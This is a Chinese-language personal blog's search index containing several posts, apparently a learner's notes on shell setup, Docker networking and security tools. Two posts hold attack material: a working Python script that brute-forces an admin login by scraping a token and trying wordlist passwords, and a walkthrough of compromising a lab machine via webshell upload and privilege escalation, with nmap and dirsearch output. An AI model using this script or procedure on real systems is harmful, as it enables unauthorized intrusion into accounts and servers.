<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[AppScan报告处理脚本]]></title>
    <url>%2F2019%2F09%2F07%2FAppScan%2F</url>
    <content type="text"><![CDATA[00 前言最近独立开发了AppScan报告处理脚本, 将实现以下功能: 自动化处理扫描结果 自动化处理扫描任务 01 后续改进计划目前脚本还是比较粗糙, 仅完成了基本操作后续改进计划有: 批量处理结果(难易程度: 3) 批量进行扫描(难易程度: 2) 批量进行扫描并自动进行结果处理(难易程度: 7) 去除数据库依赖, 仅使用HTML文档内容(难易程度: 6) 02 任务安排按照计划顺序进行, 预计前3计划能在9月底完成 待更新… document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Sec</category>
        <category>AppScan</category>
        <category>Python</category>
        <category>AppScan</category>
      </categories>
      <tags>
        <tag>AppScan</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[测试用]]></title>
    <url>%2F2019%2F08%2F30%2Ftest%2F</url>
    <content type="text"><![CDATA[00 前言test document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Others</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Shell调优]]></title>
    <url>%2F2019%2F08%2F29%2Fshell_optimize%2F</url>
    <content type="text"><![CDATA[00 前言今天来折腾一下最后的shell调优，参考以前的fish安装和tmux设置 今天折腾的就将会是最终的shell界面了 01. 设置自启和默认shell这里我们设置一下默认shell是fish，然后默认打开tmux 01. 默认打开shell为oh-my-fish参考链接：不要把fish设置成默认fish from Arch Linux 在.bashrc最后加入exec fish就可以了 如果你想进入bash而不是fish，使用命令 bash --norc !!!下面的操作过于危险，我们选择上面更好的 设置fish为默认shell参考链接 123456789101112如何把 fish 设置为我默认的 shell?添加 Fish 到 /etc/shells:echo "/usr/local/bin/fish" | sudo tee -a /etc/shells切换并保存默认 shell:chsh -s /usr/local/bin/fish切换之前的 shell:一般来说是 /bin/bash、/bin/tcsh 或者 /bin/zsh.chsh -s /bin/bash上面是参考答案，首先找出fish这个shell在哪里 whereis fish 我的是在/usr/bin/fish上，更改后重连即可 02. 终端默认开启tmux更改 .bashrc 12345678if [[ -z "$TMUX" ]] ;then ID="`tmux ls | grep -vm1 attached | cut -d: -f1`" # get the id of a deattached session if [[ -z "$ID" ]] ;then # if not available create a new one tmux new-session else tmux attach-session -t "$ID" # if available attach to it fifi 参考链接这里面的每次启动shell时连接上之前的tmux 坑点血淋淋的教训，谨记谨记 不要把fish设置成默认shell，很麻烦，在.bashrc里设置自启就好，需要bash的时候就bash -norc即可，非常方便 把tmux的.bashrc设置放在fish前面，顺序不要搞错，不然就没有想要的效果 最后结果如下： document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Linux</category>
        <category>Shell</category>
      </categories>
      <tags>
        <tag>Shell</tag>
        <tag>PS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SwitchyOmega]]></title>
    <url>%2F2019%2F08%2F29%2FswitchOmege%2F</url>
    <content type="text"><![CDATA[00 前言强烈推荐SwitchyOmega！ 插件SwitchyOmega在Chrome和Firefox上都有，强烈推荐需要“文明#PC#上网”的朋友！ 首先推荐阅读链接：简单配置 配置上图，主要有两个配置 2. 对于PAC没有涉及到的网站，手工进行添加即可 然后在配置文件中就可以看到添加的文件了，我把配置放上来 我把网址参数发上来 https://raw.githubusercontent.com/gfwlist/gfwlist/master/gfwlist.txt 参考网站2 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Browers</category>
        <category>Network</category>
        <category>SwitchyOmega</category>
        <category>Chrome</category>
      </categories>
      <tags>
        <tag>Network</tag>
        <tag>Proxy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[VSCode写Python调优]]></title>
    <url>%2F2019%2F08%2F29%2Fvscode_optimize%2F</url>
    <content type="text"><![CDATA[00 前言VS Code天下第一, 现在说一下VS Code写python的时候一些调优 01 代码错误提示和补全首先在settings.json中加入python.linting.enabled为true截图如下: 然后直接在设置首选项搜索flake8, autopep8全部勾选上 02 函数提示Emmm, 暂未发现, 先保存一下, 后续补充 03 快捷键大全官方文档GitHub中文版 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>VSCode</category>
      </categories>
      <tags>
        <tag>VSCode</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Docker网络类]]></title>
    <url>%2F2019%2F08%2F29%2Fdocker_network_configuration%2F</url>
    <content type="text"><![CDATA[00 前言今天任务： 提高安全性，使用容器网络连接不同容器 连接使用固定ip，以防容器重启后地址改变 研究容器网络链接如何实现 01 实现方式 : Docker容器访问与互联 （端口映射）过时资料 推荐参考链接 –name –hostname参数 首先设置各个容器的名称，使用–name参数 -p 和 -P 的区别就是一个指定端口，一个随机端口 删除所有容器（不兼容fish）： docker rm $(docker ps -a -q) 列出所有容器的IP地址： 1docker inspect --format='{{.Name}} - {{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' $(docker ps -aq) 02 容器间通信 （容器互联）已不支持–link参数 ~ –link :alias ~ ~ 参考连接 ~ 继续更新，两班倒的生活真是要人命 03 进阶结果 （hostname直接访问）居然找的是过时的4年前的资料。。。 一口老血吐出来，经过大佬指点，直接使用hostname访问即可 --name和--hostname有什么区别？ name只是容器名字，用来容器操作 hostname为容器主机名字，可以用来网络查找，类似于域名，但却缺少DNS过程，详细DNS过程以后再详细研究（应该涉及到跨主机容器通信） 这里有个疑问点：使用hostname访问需不需要创建网络？ 不行，指定IP的话就必须要创建一个网络 不指定IP的话，–add-host参数又好像不太可用所以还是创建一个网络最保险 04 网络设置创建网络 docker network create -d bridge my-bridge-network 删除网络 docker network rm my-bridge-network 设置子网 docker network create --subnet=172.18.0.0/16 mynetwork 12345678docker network所有子命令如下：docker network createdocker network connectdocker network lsdocker network rmdocker network disconnectdocker network inspect 创建网络参考链接1创建网络参考链接2_推荐链接 05 –expose参数EXPOSE 仅仅是声明容器打算使用什么端口而已，并不会自动在宿主进行端口映射只是一个声明，在运行时并不会因为这个声明应用就会开启这个端口的服务 用法 ： --expose 3389 expose优秀参考链接 06 最后结果最后结果为： 创建一个网络，分配子网 docker network create --subnet=172.18.0.0/16 mynetwork 创建容器时，使用--ip指定IP 使用expose避免暴露端口到主机 添加name和hostname 使用--add-host把容器加进host表 --add-host NAME:IP 最后结果命令为： 123docker network create --subnet=172.18.0.0/16 GitHub_NetWork # 创建网络docker run -itd --expose 27017 --name mongo_name --hostname mongo --network test_network --ip 172.18.0.2 --add-host hawkeye:172.18.0.3 -v $PWD/db:/data/db mongo # 创建容器docker run -tid -p 8004:80 --name hawkeye_name --hostname hawkeye --network test_network --ip 172.18.0.3 --add-host mongo:172.18.0.2 -e MONGODB_URI=mongodb://mongo:27017 daocloud.io/0xbug/hawkeye # 创建容器2 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Linux</category>
        <category>Docker</category>
        <category>Network</category>
        <category>Docker</category>
      </categories>
      <tags>
        <tag>Docker</tag>
        <tag>Netwrok</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MarkDown跳转]]></title>
    <url>%2F2019%2F08%2F29%2Fmarkdown_grammar%2F</url>
    <content type="text"><![CDATA[00 前言记录MarkDown遇到的用法 01_页内跳转 首先先定义一个anchor &lt;span id="jump_anchor"&gt;这里是注释，位于跳转之后的地方&lt;/span&gt; 显示结果为 这里是注释，位于跳转之后的地方 然后使用markDown语法 [点击跳转](#jump_anchor) 会跳转到显示结果这里。如果需要测试，往下翻到最后。 点击跳转 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>MarkDown</category>
      </categories>
      <tags>
        <tag>MarkDown</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python request模块进行破解]]></title>
    <url>%2F2019%2F08%2F29%2Fpython_bruteforce_simple1%2F</url>
    <content type="text"><![CDATA[00 前言 今日份目标：暴力破解成功 流程：使用python进行任务 1. 模块使用python request模块 2.步骤如下 用request模块请求url 对于返回包进行切片操作，获取其中的token值 将获取到的token值与字典一起发送进行暴力破解 3.步骤开始参考网址 参考网址1：用来request的用法 参考网址2：最终实现方法 参考网址3:获取token 3.1Token获取代码如下：123456789101112131415import urllibimport refrom bs4 import BeautifulSoupfrom distutils.filelist import findallhost = "http://打码用***打码用/c/hdyzma/"page = urllib.request.urlopen(host)contents = page.read()soup = BeautifulSoup(contents,"html.parser")#soup的用法print(soup.find('input',style='display:none')['value'])#这里用法 是 find后面一个参数是标签，然后找到特殊的字符‘style=none’，最后获取其中的value值 3.2 字典取list参考网址1：编码问题 坑点二：文件操作问题 参考网址 遇到的情况： 1234Traceback (most recent call last): File "03_crake.py", line 5, in &lt;module&gt; get = f.readline()io.UnsupportedOperation: not readable 解决方法：open函数里 ‘a’ 改为’r’ 坑点三：rockyou.txt出现编码问题 原因：rockyou文本太大，里面有一下密码会导致编码出错无法读取之类的 解决办法：新建一个simple文本，填入大概100个密码 坑点四：发包之后显示token错误 原因：发的包里没有sessionid 解决办法：加进去 解决代码：s = requests.session() ​ s.get / s.post 3.3 循环for get in gets 4. 完成！最后代码如下： 123456789101112131415161718192021222324252627282930313233343536import urllibimport refrom bs4 import BeautifulSoupfrom distutils.filelist import findallimport requestsgets = open("C:/Users/Elliot/Desktop/python_req_crack/simple.txt","r").read().splitlines()host = "http://打码用***打码用/c/hdyzma/"s = requests.session()for get in gets: contents = s.get(host,proxies={'http': 'http://127.0.0.1:8080'}).content soup = BeautifulSoup(contents, "html.parser")# soup的用法 token = soup.find('input', style='display:none')['value'] #print(token)#for line in f.readlines(): print(get) # print(line)#这里用法 是 find后面一个参数是标签，然后找到特殊的字符‘style=none’，最后获取其中的value值 url = host+'welcome.php' d = {'name': 'admin','password':get,'token':token } r = s.post(url, data=d,proxies={'http': 'http://127.0.0.1:8080'}) r.encoding = 'UTF-8' print(r.text) 最后说一句，Python牛逼！（喊破音） document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Python</category>
        <category>Brute force</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[安全基础知识]]></title>
    <url>%2F2019%2F08%2F29%2Fsec_base_knowladge%2F</url>
    <content type="text"><![CDATA[00 前言基础知识 1.安全术语 B/S架构：即浏览器（Browser）和服务器（Server）结构。客户机上只要安装一个浏览器（Browser），如IE，服务器安装Oracle、Nginx或 SQL Server等数据库。浏览器通过Web Server同数据库进行数据交互。 这样就大大简化了客户端电脑载荷，减轻了系统维护与升级的成本和工作量，降低了用户的总体成本。 C/S结构：客户机（Client）和服务器（Server）结构，充分利用两端硬件环境的优势，将任务合理分配到Client端和Server端来实现，降低了系统的通讯开销。 网站漏洞：也就是Web漏洞。随着B/S模式被广泛的应用，用这种模式编写Web应用程序的程序员也越来越多。但由于开发人员的水平和经验参差不齐，相当一部分的开发人员在编写代码的时候，没有对用户的输入数据或者是页面中所携带的信息(如Cookie)进行必要的合法性判断，导致了攻击者可以利用这个编程漏洞来入侵数据库或者攻击Web应用程序的使用者，由此获得一些重要的数据和利益。 网页木马：简称“网马”。网页木马就是表面上伪装成普通的网页文件或是将恶意的代码直接插入到正常的网页文件中，当有人访问时，网页木马就会利用对方系统或者浏览器的漏洞自动将配置好的木马的服务端下载到访问者的电脑上来自动执行。 渗透测试：专业人员采用“攻击者心态”，使用实际攻击者利用的相同的工具和技术来探测安全漏洞。渗透测试被广泛认为对系统安全性的最好检验，因为它最接近真实世界的攻击。 安全基线：是借用“基线”的概念。字典上对“基线”的解释是：一种在测量、计算或定位中的基本参照。如海岸基线，是水位到达的水位线。类比于“木桶理论”，可以认为安全基线是安全木桶的最短板，或者说，是最低的安全要求。 OWASP Top 10：开放式Web应用程序安全项目（OWASP，Open Web Application Security Project）是一个非营利组织。OWASP Top 10指该组织发布的10个最常见的WEB攻击方式。 网络渗透：指对大型的网络主机服务器群组采用的一种迂回渐进式的攻击方法，通过长期而有计划地逐步渗透攻击进入网络，最终完全控制整个网络。“网络渗透攻击”之所以能够成功，是因为网络上总会有一些或大或小的安全缺陷或漏洞。 IPS：入侵防御系统(IPS: Intrusion Prevention System)是电脑网络安全设施，是对防病毒软件（Antivirus Programs）和防火墙(Packet Filter, Application Gateway)的补充。 入侵预防系统(Intrusion-prevention system)是一部能够监视网络或网络设备的网络资料传输行为的计算机网络安全设备，能够即时的中断、调整或隔离一些不正常或是具有伤害性的网络资料传输行为。 Tomcat:Tomcat 服务器是一个免费的开放源代码的Web 应用服务器，对于一个初学者来说，可以这样认为，当在一台机器上配置好Apache 服务器，可利用它响应HTML（标准通用标记语言下的一个应用）页面的访问请求。 JSP:全称Java Server Pages，是一种动态网页开发技术。它使用JSP标签在HTML网页中插入Java代码。标签通常以&lt;%开头，以%&gt;结束。 ASP 指 Active Server Pages （动态服务器页面）,是一项微软公司的技术,运行在IIS 中运行的程序。ASP 文件和 HTML 文件类似，可包含文本、HTML、XML 和脚本。ASP 文件中的脚本可在服务器上执行，文件的扩展名是 “.asp” PHP是 “PHP Hypertext Preprocessor” 的首字母缩略词,是一种被广泛使用的开源脚本语言。PHP 脚本在服务器上执行，使用PHP 没有成本，可供免费下载和使用。一般认为PHP语言是后端语言，与数据库相关 webshell（网页后门）：网页后门其实就是一段网页代码，主要以ASP和PHP代码为主。攻击者通过这段精心设计的代码，在服务器端进行某些危险的操作，获得某些敏感的技术信息或者通过渗透，提权获得服务器的控制权。webshell可以穿越服务器防火墙，由于与被控制的服务器或远程过80端口传递的，因此不会被防火墙拦截。并且使用webshell一般不会在系统中留下记录，只会在网站的web日志中留下一些数据提交记录，没有经验的管理员是很难看出入侵痕迹的。插入webshell的过程就叫做getshell hash：一般翻译做“散列”，也有直接音译为“哈希”的，就是把任意长度的输入（又叫做预映射， pre-image），通过散列算法，变换成固定长度的输出，该输出就是散列值。这种转换是一种压缩映射，也就是，散列值的空间通常远小于输入的空间，不同的输入可能会散列成相同的输出，所以不可能从散列值来唯一的确定输入值。简单的说就是一种将任意长度的消息压缩到某一固定长度的消息摘要的函数。常见算法有MD5,SHA，一般用于文件校验防篡改 2. OSI-TCP-HTTP OSI 开放式系统互联通信参考模型（英语：Open System Interconnection Reference Model，缩写为 OSI），简称为OSI模型（OSI model），一种概念模型，由国际标准化组织提出，一个试图使各种计算机在世界范围内互连为网络的标准框架。参考价值居多，更常用TCP/IP协议 TCP/IP 互联网协议（Internet Protocol Suite）是一个网络通信模型，以及一整个网络传输协议家族，为互联网的基础通信架构。它常被通称为TCP/IP协议族（英语：TCP/IP Protocol Suite，或TCP/IP Protocols），其中因为该协议家族的两个核心协议：TCP（传输控制协议）和IP（网际协议）用的最多，所以简称TCP/IP。注意它是一整个协议簇。 HTTP :待补充。。。 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Sec</category>
      </categories>
      <tags>
        <tag>Sec</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[安全工具]]></title>
    <url>%2F2019%2F08%2F29%2Fsec_tools%2F</url>
    <content type="text"><![CDATA[00 前言安全工具类 NMAP01 NMAP是什么？ Nmap (“Network Mapper(网络映射器)”) 是一款开源的网络探测和安全审核的工具。用来对网络上的主机进行嗅探，发现。它的设计目标是快速地扫描大型网络，当然用它扫描单个主机也没有问题。 02 NMAP干什么？ Nmap是被专业人员广泛使用的一款功能全面的端口扫描工具。由于Nmap品质卓越，使用灵活，它已经是渗透测试人员必备的工具。除了端口扫描外，Nmap还具备如下功能：主机探测，服务/版本检测（-sV），操作系统检测（-O），网络路由跟踪（-ttl），Nmap脚本引擎（-sC）。 03 有什么功能特点？ 灵活。支持数十种不同的扫描方式，支持多种目标对象的扫描。比如单Ping，TCP/UDP/端口扫描强大。Nmap可以用于扫描互联网上大规模的计算机。 04 作用对象（用来扫什么） 一般用来主机扫描，信息收集，端口扫描，主机存活等。带上–script参数可用插件进行强大的扫描。 Brup Suite01 Brup是什么？ Brup Suite 是用于攻击web应用程序的集成平台。它可以对包进行强大的操作与修改。它包含了许多工具，并为这些工具设计了许多接口，以促进加快攻击应用程序的过程。所有的工具都共享一个能处理并显示HTTP 消息，持久性，认证，代理，日志，警报的一个强大的可扩展的框架。 02 Brup能干什么？ Burp支持手动的Web应用程序测试的活动。它可以让你有效地结合手动和自动化技术，使您可以完全控制所有的BurpSuite执行的行动，并提供有关您所测试的应用程序的详细信息和分析。 03 Brup有什么功能特点？ Brup一共有11个功能选项，分别是： target - 对目标域设置，站点地图爬取目标网站 proxy – Burp Suite设置代理，抓取数据包。 Spider – Burp Suite的蜘蛛功能是用来抓取Web应用程序的链接和内容等。 Scanner – 是用来扫描Web应用程序漏洞的，可以发现常见的web安全漏洞，但会存在误报的可能。 Intruder – 可进行Web应用程序模糊测试,进行暴力猜解等。 Repeater – 对数据包进行重放，可分析服务器返回情况，判断修改参数的影响。 Sequencer – 用来检查Web应用程序提供的会话令牌的随机性.并执行各种测试。 Decoder – 对数据进行加解密操作，包含url、html、base64等等。 Comparer – 此功能用来执行任意的两个请求,响应或任何其它形式的数据之间的比较。 extender - 加载Burp Suite的扩展，使用你自己的或第三方代码来扩展Burp Suite的功能。 options - 设置burp，字体，编码等等 alerts - 是用来存放报错信息的，用来解决错误 使用参考链接 04 作用对象（用来干什么） 首先使用burp抓取数据包的proxy功能，设置代理常用Repeater进行重复手工发包测试，Intruder暴力破解 使用参考链接 Nessus01 Nessus是什么？ Nessus号称是世界上最流行的漏洞扫描程序。该工具提供完整的电脑主机漏洞扫描服务，并随时更新其漏洞数据库。Nessus可同时在本机或远端上遥控，进行系统的漏洞分析扫描。Nessus也是渗透测试重要工具之一。 02 Nessus能干什么？ Nessus通常包括成千上万的最新的漏洞，各种各样的扫描选项，及易于使用的图形界面和有效的报告。 03 Nessus有什么功能特点？ 可自行定义插件(Plug-in)。其运作效能能随着系统的资源而自行调整。如果将主机加入更多的资源(例如加快CPU速度或增加内存大小),其效率表现可因为丰富资源而提高。完整支持SSL (Secure Socket Layer)。 04 作用对象 对服务器主机（IP）进行漏洞扫描。对整个网络（不只是内网，同一网段）进行漏扫 WVSWVS是什么 WVS(Web Vulnerability Scanner)是一个自动化的Web应用程序安全测试工具。Acunetix公司使用的领先的Web漏洞扫描器，被广泛赞誉为包括最先进的SQL注入和XSS黑盒扫描技术。它自动爬行您的网站，并执行黑盒和灰盒黑客技术，发现危险的漏洞，可能危及您的网站和数据的漏洞。 WVS能干什么？ awvs针对SQL注入、XSS、XXE、SSRF、主机头注入以及4500多个其他web漏洞的精确测试。通过内置的漏洞管理特性，简化了Web应用程序安全过程，这些特性帮助您确定漏洞的优先级并管理漏洞解析. WVS 特性 黑盒测试深入爬行和分析-自动扫描所有网站。低误报率,漏洞检测率最高。集成漏洞管理-优先级和控制威胁 WVS 作用对象 对web进行漏扫，并输出报告 Python01 Python是什么？ Python是一种广泛使用的高级编程语言，属于通用型编程语言。它面向对象，解释型的语言。 Pythn能干什么？ 数据分析。Numpy &amp; Scipy、Pandas、matplotlib 是 Python 最基本数据分析的三驾马车，而 Jupyter notebook 则是分析的最基本交互式环境。后续则可以学习更为强大的工具，如分布式计算 pyspark，机器学习，深度学习，神经网络等等，Python 都能找到成熟的包以供使用。 网络数据采集。 数据分析离不开数据采集，使用 Python 的标准库 urllib 去网络采集一些简单数据，图快也会使用 requests，beautifulsoup 是非常不错的 html 解析工具。后续更高级的可以学习 Python 爬虫框架 pyspider，scrapy 等，以及分布式爬虫。 Web 开发。 主要使用 django 作为开发框架。 Python特性是什么？ 其本身拥有一个巨大而广泛的标准库。还可以导入著名第三方库和自建库 Python的设计哲学强调代码的可读性和简洁的语法（尤其是使用空格缩进划分代码块，而非使用大括号或者关键词） Python拥有动态类型系统和垃圾回收功能，能够自动管理内存使用，并且支持多种编程范式，包括面向对象、命令式、函数式和过程式编程。 Python是解释型语言，因此没有编译文件 Python 作用对象 开发写出小工具进行批量处理，扫描，漏洞测试写爬虫 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Sec</category>
      </categories>
      <tags>
        <tag>Sec</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[比ConEmu更好用的Cmder]]></title>
    <url>%2F2019%2F08%2F29%2Fcmder%2F</url>
    <content type="text"><![CDATA[00 前言今天就介绍一个新的工具：Cmder 这个工具是封装了ConEmu的，比ConEmu更强大分为两个版本，便携版和full版本，full版本更强大，启动也更慢 推荐用法 首先是常开，不关闭，默认切换按钮的 1ctrl+` 打开新的标签叶为 1ctrl+t 关闭为 1ctrl+w 切换用 1ctrl+Tab 设置成开机自启 其余美化和更好用的点击参考链接 配色方案推荐使用 1Monokai document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Windows</category>
        <category>Cmder</category>
      </categories>
      <tags>
        <tag>Cmder</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[靶机getshell]]></title>
    <url>%2F2019%2F08%2F29%2Fgetshell_in_target_drone%2F</url>
    <content type="text"><![CDATA[00 前言某次靶机getshell过程 1. 信息收集01. nmap扫描首先对靶机进行nmap全端口版本识别扫描 扫描结果如下：点击跳转 从nmap扫描，以及配合访问，发现了82，84，85端口是可以访问，有网站存在的 接下来进行子目录爆破看看后台在哪 02. 扫描子目录对两个网站进行子目录爆破，第三个85端口已经有登录处了，故跳过 82端口扫描结果 84端口扫描结果 03. 后续操作从两个网站后台进去，基本都是弱密码，如果不是，可以考虑用暴力破解，这里就派的上用场了 82端口的后台登录在/system/ 84端口在/admin/ 2. 漏洞挖掘我们的思路是找到上传点，把马上传上去 我们进入了85后台之后，发现了上传点如下 我们成功把马上传上去之后,可以在info里找到它的路径，或者从后台内容管理的地方中找出来。 连上菜刀成功 3. 提权网上找了找资料，发现SecWiki的提权工具最好用，附上链接 用法：通过原来上传的地方把提权工具上传上去，然后直接运行命令即可 截图如下 之后是干啥都行了，留后门以及清除痕迹的这些东西以后遇到了再进行补充 nmap扫描结果 12345678910111213141516171819202122232425262728293031root@kali:~# nmap -sV -p- -n 192.168.241.131Starting Nmap 7.70 ( https://nmap.org ) at 2019-04-21 14:21 CSTNmap scan report for 192.168.241.131Host is up (0.00049s latency).Not shown: 65515 closed portsPORT STATE SERVICE VERSION23/tcp open telnet Microsoft Windows XP telnetd80/tcp open http Apache httpd 2.2.15 ((Win32) PHP/5.3.15)82/tcp open http Microsoft IIS httpd 7.084/tcp open http Microsoft IIS httpd 7.085/tcp open http Microsoft IIS httpd 7.0135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn445/tcp open microsoft-ds Microsoft Windows Server 2008 R2 microsoft-ds (workgroup: WORKGROUP)1433/tcp open ms-sql-s Microsoft SQL Server 2008 10.00.1600; RTM2383/tcp open ms-olap4?3306/tcp open mysql MySQL 5.5.273389/tcp open ssl/ms-wbt-server?5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)49152/tcp open msrpc Microsoft Windows RPC49153/tcp open msrpc Microsoft Windows RPC49154/tcp open msrpc Microsoft Windows RPC49155/tcp open msrpc Microsoft Windows RPC49156/tcp open msrpc Microsoft Windows RPC49157/tcp open msrpc Microsoft Windows RPCMAC Address: 00:0C:29:01:46:FB (VMware)Service Info: Host: IIS70-CN; OSs: Windows XP, Windows; CPE: cpe:/o:microsoft:windows_xp, cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_server_2008:r2Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 105.96 seconds 82端口扫描结果 1234567891011121314151617181920212223242526272829303132λ python dirsearch.py -u http://192.168.241.131:82 -e asp _|. _ _ _ _ _ _|_ v0.3.8(_||| _) (/_(_|| (_| )Extensions: asp | Threads: 10 | Wordlist size: 6064Error Log: C:\Users\Elliot\OneDrive\桌面\同步文件夹\靶机渗透\dirsearch\logs\errors-19-04-21_14-32-56.logTarget: http://192.168.241.131:82[14:32:56] Starting:[14:32:56] 403 - 312B - /%2e%2e/google.com[14:32:56] 400 - 324B - /%ff/[14:33:05] 301 - 163B - /aspnet_client -&gt; http://192.168.241.131:82/aspnet_client/[14:33:05] 200 - 0B - /asp.aspx[14:33:07] 301 - 153B - /css -&gt; http://192.168.241.131:82/css/[14:33:07] 301 - 158B - /database -&gt; http://192.168.241.131:82/database/[14:33:07] 403 - 1KB - /database/[14:33:09] 301 - 155B - /image -&gt; http://192.168.241.131:82/image/[14:33:09] 301 - 156B - /images -&gt; http://192.168.241.131:82/images/[14:33:09] 301 - 156B - /Images -&gt; http://192.168.241.131:82/Images/[14:33:09] 301 - 157B - /include -&gt; http://192.168.241.131:82/include/[14:33:09] 403 - 1KB - /include/[14:33:10] 200 - 23KB - /index.asp[14:33:17] 301 - 156B - /system -&gt; http://192.168.241.131:82/system/[14:33:17] 200 - 4KB - /system/[14:33:18] 403 - 2KB - /Trace.axd[14:33:19] 500 - 3KB - /WebResource.axd?d=LER8t9aSTask Completed 84端口扫描结果 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172λ python dirsearch.py -u http://192.168.241.131:84 -e asp _|. _ _ _ _ _ _|_ v0.3.8(_||| _) (/_(_|| (_| )Extensions: asp | Threads: 10 | Wordlist size: 6064Error Log: C:\Users\Elliot\OneDrive\桌面\同步文件夹\靶机渗透\dirsearch\logs\errors-19-04-21_14-38-10.logTarget: http://192.168.241.131:84[14:38:10] Starting:[14:38:10] 403 - 312B - /%2e%2e/google.com[14:38:10] 400 - 324B - /%ff/[14:38:13] 301 - 157B - /aboutus -&gt; http://192.168.241.131:84/aboutus/[14:38:14] 301 - 155B - /ADMIN -&gt; http://192.168.241.131:84/ADMIN/[14:38:14] 301 - 155B - /admin -&gt; http://192.168.241.131:84/admin/[14:38:14] 301 - 155B - /Admin -&gt; http://192.168.241.131:84/Admin/[14:38:14] 500 - 0B - /admin%20/[14:38:14] 200 - 385B - /a%5c.aspx[14:38:14] 200 - 390B - /admin.aspx[14:38:14] 500 - 0B - /admin.[14:38:14] 200 - 540B - /admin/fckeditor/editor/filemanager/browser/default/connectors/aspx/connector.aspx[14:38:14] 200 - 506B - /admin/fckeditor/editor/filemanager/connectors/aspx/connector.aspx[14:38:14] 200 - 500B - /admin/fckeditor/editor/filemanager/connectors/aspx/upload.aspx[14:38:14] 200 - 492B - 